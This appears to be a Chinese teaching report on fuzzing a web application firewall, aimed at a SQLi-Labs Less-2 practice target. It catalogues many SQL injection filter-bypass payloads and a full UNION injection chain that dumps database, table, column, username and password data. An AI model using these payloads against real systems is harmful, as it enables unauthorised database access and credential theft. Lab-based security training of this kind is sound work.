# WAF 绕过 Fuzz 测试报告

## 📋 报告元数据

| 项目 | 内容 |
|------|------|
| 报告日期 | 2026-07-20 |
| 测试目标 | http://172.19.19.111/sql/Less-2/?id=0 |
| 靶场类型 | SQLi-Labs Less-2 (GET-based, 数字型注入) |
| 前置防护 | 未知 WAF（需通过 Fuzz 确认类型与规则） |

---

## 一、Fuzz 测试方法论

### 1.1 测试流程

```
阶段1: 基线探测 ──→ 阶段2: 关键字绕过 ──→ 阶段3: 空格绕过 ──→ 阶段4: 运算符绕过
        │                                        │
        ▼                                        ▼
阶段5: 函数绕过 ──→ 阶段6: 编码绕过 ──→ 阶段7: 注释绕过 ──→ 阶段8: 高阶绕过
```

### 1.2 判断标准

| 状态 | 判断依据 | 含义 |
|------|----------|------|
| ✅ ALLOWED | HTTP 200 + 响应体含正常 SQL 执行结果 | 绕过成功 |
| ❌ BLOCKED | HTTP 非 200 / 响应体过小 / 含拦截提示文字 | 被 WAF 拦截 |
| ⚠️ NEED CHECK | 响应异常但不确定 | 需人工验证 |

---

## 二、WAF 检测技术清单

### 2.1 基线探测（阶段1）

用于确认 WAF 是否存在及拦截特征：

```sql
# 正常请求（对照基线）
GET /sql/Less-2/?id=1                    → 预期: 200, 正常页面

# 基础注入探测
GET /sql/Less-2/?id=1'                   → 预期被拦: 判断是否拦截单引号
GET /sql/Less-2/?id=1 and 1=1            → 预期被拦: 判断关键字拦截
GET /sql/Less-2/?id=1 or 1=1             → 预期被拦: 判断关键字拦截
GET /sql/Less-2/?id=0 union select 1,2,3 → 预期被拦: 判断union拦截
```

**WAF 识别技巧**：根据拦截响应（状态码/页面内容）判断 WAF 类型：
- 返回 403 → 可能是 ModSecurity 或云 WAF
- 返回 406 → 可能是安全设备
- 返回自定义页面 → 自建 WAF / 反向代理
- 返回空页面 → 可能是 WAF 直接丢弃请求

### 2.2 关键字绕过（阶段2）

#### 2.2.1 UNION 关键字绕过

```sql
-- 大小写绕过
union select    →   uNiOn sElEcT

-- 注释插入绕过
union select    →   UN/**/ION SE/**/LECT

-- 双写绕过（WAF只替换一次）
union select    →   UNUNIONION SELSELECTECT

-- %0a 换行分隔
union select    →   union%0aselect

-- Tab 分隔
union select    →   union%09select

-- 花括号（MySQL特性）
union select    →   {union}{select}

-- 反引号（MySQL特性）
select 1        →   `select` 1

-- 内联注释（MySQL独有）
union select    →   /*!union*/ /*!select*/
```

#### 2.2.2 AND/OR 关键字绕过

```sql
-- 符号替代
and 1=1         →   && 1=1
or 1=1          →   || 1=1

-- 异或（返回奇偶不同结果，可盲注）
and 1=1         →   xor 1=1

-- 注释插入
and             →   a/**/nd
or              →   o/**/r

-- 双写绕过
and             →   aanndd
or              →   oorr
```

### 2.3 空格绕过（阶段3）

```sql
-- URL编码空格
union select    →   union%20select

-- 注释代替空格（最常用）
union select    →   union/**/select

-- Tab 代替空格
union select    →   union%09select

-- 换行符
union select    →   union%0aselect

-- 回车+换行
union select    →   union%0d%0aselect

-- 加号
union select    →   union+select

-- 括号消除空格（数字型注入专属）
1 union select  →   1)union(select
```

### 2.4 比较运算符绕过（阶段4）

```sql
-- WAF规则: 拦截 1=1

-- LIKE 替代
1=1             →   1 LIKE 1

-- IN 替代
1=1             →   1 IN (1)

-- BETWEEN 替代
1=1             →   1 BETWEEN 0 AND 2

-- 不等号取反
1=1             →   NOT 1<>1

-- 大于小于
1=1             →   1>0 AND 1<2

-- REGEXP 正则匹配
1=1             →   1 REGEXP 1
```

### 2.5 字符串与函数绕过（阶段5）

```sql
-- CHAR() 函数替代字符串
select 'a'      →   select CHAR(97)

-- HEX 十六进制
select 'admin'  →   select 0x61646d696e

-- CONCAT 拼接
select 1,2,3    →   select 1,CONCAT(2),3

-- 信息函数（绕过select限制）
user()          →   /*!user*/()
version()       →   /*!version*/()
database()      →   /*!database*/()
```

### 2.6 编码绕过（阶段6）

```sql
-- URL双重编码
%20             →   %2520
'               →   %2527

-- Unicode 编码（部分WAF解码不完整）
union           →   u%006eion
select          →   sel%0063t

-- 十六进制字符串绕过
select 1,2,3    →   select 1,0x32,3

-- 全URL编码
union select    →   %75%6e%69%6f%6e %73%65%6c%65%63%74
```

### 2.7 注释与数据库特性（阶段7）

```sql
-- MySQL 内联注释（只在MySQL生效）
/*!union*/ /*!select*/

-- 版本号内联注释（模拟低版本绕过）
/*!50000union*/ /*!50000select*/

-- 井号注释
union select 1,2,3# 

-- 双减号注释
union select 1,2,3--

-- 换行注释绕过
union#comment
select 1,2,3

-- 空字节截断（部分WAF遇到%00停止解析）
union sel%00ect
```

### 2.8 高阶绕过技术（阶段8）

```sql
-- HTTP参数污染 HPP（WAF与后端解析参数顺序不同）
?id=0&id=union&id=select&id=1,2,3

-- 缓冲区溢出（构造超长请求使WAF崩溃）
?id=1 AND (select 1 from (select(0))a) AND ...
(后接超长填充字符)

-- 科学计数法绕过
id=0e0union select 1,2,3

-- 请求方法切换
GET → POST（将SQL注入放在POST body中）

-- Content-Type 绕过
application/x-www-form-urlencoded → multipart/form-data

-- HTTP 头注入
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
```

---

## 三、WAF 类型判断矩阵

根据 Fuzz 结果，可通过下表反推 WAF 类型：

| WAF 特征 | 可能类型 |
|----------|----------|
| 拦截单引号、双引号但不拦截数字 | 简单规则型 WAF |
| 拦截 `union` `select` 关键字 | 签名匹配型 WAF |
| 不拦截 `/**/` 注释绕过 | 未启用正则表达式引擎 |
| 拦截 `/*!*/` 内联注释 | MySQL 专有规则 |
| 拦截 `%0a` 换行但只单次匹配 | 正向匹配 WAF（可双写绕过） |
| 拦截大小写变体 | 不区分大小写 WAF |
| 参数污染生效 | WAF 和 后端参数解析不一致 |
| 仅拦截 GET 参数 | 查询参数型 WAF，POST Body 不受限 |

---

## 四、常见 WAF 绕过策略总结（按优先级排序）

### 🥇 最常用/成功率最高

```
1. 注释插入绕过    →  union/**/select
2. 大小写混写      →  uNiOn sElEcT
3. 编码绕过        →  %75%6e%69%6f%6e
4. 内联注释        →  /*!union*/ /*!select*/
5. 双写绕过        →  UNUNIONION
```

### 🥈 次常用

```
6.  换行分隔       →  union%0aselect
7.  括号消除空格    →  id=0)union(select
8.  LIKE/IN 替代    →  id=1 like 1
9.  HTTP参数污染    →  ?id=0&id=union...
10. 请求方法切换    →  GET → POST
```

### 🥉 针对性策略

```
11. 编码组合       →  双URL编码 + Unicode
12. 缓冲区溢出     →  构造超长payload
13. Content-Type换  →  multipart/form-data
14. HTTP头伪造     →  X-Forwarded-For
15. 空字节截断     →  %00
```

---

## 五、针对 Less-2 数字型注入的专用 Payload

Less-2 是数字型注入（`$id` 没有引号包裹），无需闭合引号，绕过更简单：

```sql
-- 基础（如果WAF不拦截）
id=0 union select 1,2,3

-- 注释绕过（最推荐）
id=0 union/**/select/**/1,2,3

-- 大小写+注释
id=0 uNiOn/**/sElEcT/**/1,2,3

-- 获取数据库名
id=0 union/**/select/**/1,database(),3

-- 获取所有数据库
id=0 union/**/select/**/1,group_concat(schema_name),3/**/from/**/information_schema.schemata

-- 获取数据表（以security为例）
id=0 union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()

-- 获取列名（以users表为例）
id=0 union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name='users'

-- 获取数据
id=0 union/**/select/**/1,group_concat(username,0x3a,password),3/**/from/**/users
```

---

## 六、自动化 Fuzz 脚本使用说明

项目内已包含 `waf_fuzz.sh` 自动化测试脚本。

```bash
# 1. 将脚本 copy 到您的校园网环境（能访问 172.19.19.111）
# 2. 赋予执行权限
chmod +x waf_fuzz.sh

# 3. 运行
bash waf_fuzz.sh

# 4. 查看结果
ls waf_fuzz_results/
```

脚本覆盖 **8 个阶段，约 50+ 种绕过方式**，输出保存在 `waf_fuzz_results/` 目录中，每个请求的 HTTP 状态码、响应大小、耗时都会被记录，方便对比分析。

---

## 七、漏洞复现报告（学生填写模板）

完成测试后，请填写以下模板提交：

```
========================================
SQL注入绕过测试报告
========================================

测试人：____________
测试日期：____________

=== 一、WAF 基本信息 ===
WAF 类型（根据拦截特征推测）：____________
拦截特征（状态码/页面内容）：____________

=== 二、绕过成功的 Payload 列表 ===
1. 成功方式1: ____________
   Payload: ____________
   
2. 成功方式2: ____________
   Payload: ____________

=== 三、注入利用 ===
数据库版本：____________
当前数据库名：____________
数据表列表：____________
列名列表：____________
提取的数据样例：____________

=== 四、WAF 规则总结 ===
WAF 拦截的内容：____________
WAF 未拦截的内容：____________
绕过核心原理：____________

=== 五、学习心得 ===
__________________________________________________
__________________________________________________
```

---

## 八、总结

本报告系统整理了 SQL 注入场景下 WAF 绕过的 **8 大类、50+ 种** 技术手段，覆盖了从最基础的注释绕过到高阶的 HTTP 参数污染、缓冲区溢出等攻击手法。

**核心绕过思路归纳为三点：**

1. **改变WAF看到的，保持后端看到的** — 用注释/编码/大小写让WAF正则匹配失败
2. **利用WAF与后端解析差异** — 参数污染、特殊编码、Content-Type切换
3. **使WAF失效** — 缓冲区溢出、空字节截断、请求方法切换

建议按照 `waf_fuzz.sh` 脚本逐阶段测试，先定位 WAF 的拦截规则边界，再有针对性地选用绕过技术，效率最高。
